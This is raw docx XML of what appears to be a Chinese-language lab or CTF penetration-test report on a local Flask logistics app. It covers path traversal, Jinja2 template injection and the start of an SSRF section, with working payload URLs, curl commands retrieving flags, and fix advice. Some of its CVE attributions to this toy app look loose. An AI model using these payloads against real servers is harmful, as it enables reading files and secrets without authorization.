      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>根目錄之外的任意檔案，包括系統敏感檔案和含有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flag </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>的檔案。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>重現步驟</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>發送含有路徑穿越字元的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP GET </w:t>
      </w:r>
      <w:r>
        <w:t>請求至</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> /download?file=</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ../ </w:t>
      </w:r>
      <w:r>
        <w:t>嘗試訪問上層目錄</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>成功讀取</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> /tmp/logistics_db.txt </w:t>
      </w:r>
      <w:r>
        <w:t>取得</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>攻擊</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://127.0.0.1:5000/download?file=../../tmp/logistics_db.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>測試結果截圖</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$ curl -s "http://localhost:5000/download?file=../../tmp/logistics_db.txt"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;pre&gt;FLAG{path_traversal_cve_2021_41773}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/pre&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="00780606">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="2888615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擷取畫面 2026-04-30 1234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06" w:rsidRDefault="00780606">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5486400" cy="29432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擷取畫面 2026-04-30 1236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D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>修補建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> os.path.realpath() </w:t>
      </w:r>
      <w:r>
        <w:t>正規化路徑，並驗證其是否以允許的基礎目錄開頭</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>實作路徑驗證函數：</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   def is_safe_path(basedir, path):</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">       real_path = os.path.realpath(path)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">       return real_path.startswith(os.path.realpath(basedir))</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Allowlist </w:t>
      </w:r>
      <w:r>
        <w:t>限制可下載的檔案名稱，禁止包含路徑分隔符</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:t>考慮使用固定的檔案映射表，而非直接使用使用者輸入作為檔案路徑</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">3.3 </w:t>
      </w:r>
      <w:r>
        <w:t>伺服端模板注入（</w:t>
      </w:r>
      <w:r>
        <w:t>SSTI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對應</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-20</w:t>
            </w:r>
            <w:r>
              <w:t>22-22963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影響端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>GET /greet?name=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風險等級</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>嚴重（</w:t>
            </w:r>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
            <w:r>
              <w:t>）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 xml:space="preserve">CVSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>分數</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>9.8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">/greet </w:t>
      </w:r>
      <w:r>
        <w:t>端點將使用者輸入的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> name </w:t>
      </w:r>
      <w:r>
        <w:t>參數直接嵌入</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTML </w:t>
      </w:r>
      <w:r>
        <w:t>字串中，並使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> render_template_string() </w:t>
      </w:r>
      <w:r>
        <w:t>進行渲染。由於</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Jinja2 </w:t>
      </w:r>
      <w:r>
        <w:t>模板引擎會解析和執行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> {{ }} </w:t>
      </w:r>
      <w:r>
        <w:t>內的表達式，攻擊者可以注入模板語法來執行任意</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r>
        <w:t>代碼、讀取應用程式配置（包含敏感資訊如</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
      <w:r>
        <w:t>），甚至執行系統命令。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>重現步驟</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>發送含有</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Jinja2 </w:t>
      </w:r>
      <w:r>
        <w:t>模板語法的請求至</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> /greet?name=</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> {{7*7}} </w:t>
      </w:r>
      <w:r>
        <w:t>驗證模板注入漏洞存在（回傳</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 49</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> {{config.SECRET_FLAG}} </w:t>
      </w:r>
      <w:r>
        <w:t>讀取</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Flask </w:t>
      </w:r>
      <w:r>
        <w:t>應用程式配置中的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>攻擊</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>驗證漏洞</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t>http://127.0.0.1:5000/greet?name=%7B%7B7*7%7D%7D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>（解碼後：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>{{7*7}}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>讀取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t>http://127.0.0.1:5000/greet?name=%7B%7Bconfig.SECRET_FLAG%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>7D%7D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>（解碼後：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>{{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>config.SECRET_FLAG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>}}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>測試結果截圖</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>驗證</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSTI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$ curl -s "http://localhost:5000/greet?name=%7B%7B7*7%7D%7D"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;h2&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>您好，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>49</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>！您的貨件正在處理中。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;/h2&gt;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# </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>讀取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$ curl -s "http://localhost:5000/greet?name=%7B%7Bconfig.SECRET_FLAG%7D%7D"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;h2&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>您好，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG{ssti_cve_2022_2296</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>3}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>！您的貨件正在處理中。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:t>請在此處插入截圖</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>修補建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>不要使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> render_template_string() </w:t>
      </w:r>
      <w:r>
        <w:t>配合使用者輸入，改用靜態模板檔案</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>對使用者輸入進行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTML </w:t>
      </w:r>
      <w:r>
        <w:t>跳脫</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>若必須動態渲染，可採用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> escape() </w:t>
      </w:r>
      <w:r>
        <w:t>處理</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:t>考慮使用內容安全策略（</w:t>
      </w:r>
      <w:r>
        <w:t>CSP</w:t>
      </w:r>
      <w:r>
        <w:t>）減少模板注入的影響</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">3.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>伺服端請求偽造（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW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559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>對應</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve"> CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2021-26855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影響端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>GET /fetch?url=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>風險等級</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>高（</w:t>
            </w:r>
            <w:r>
              <w:t>High</w:t>
            </w:r>
            <w:r>
              <w:t>）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve">CVSS </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>分數</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞描述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 xml:space="preserve">/fetch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>端點接收使用者提供的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url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參數後，直接使用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requests.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>發送</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>請求並返回結果。系統未對目標</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>進行任何驗證或過濾，攻擊者可以利用此功能訪問本機（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）或內部網路資源。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>重現步驟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發送含有內部</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>的請求至</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>fetch?url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
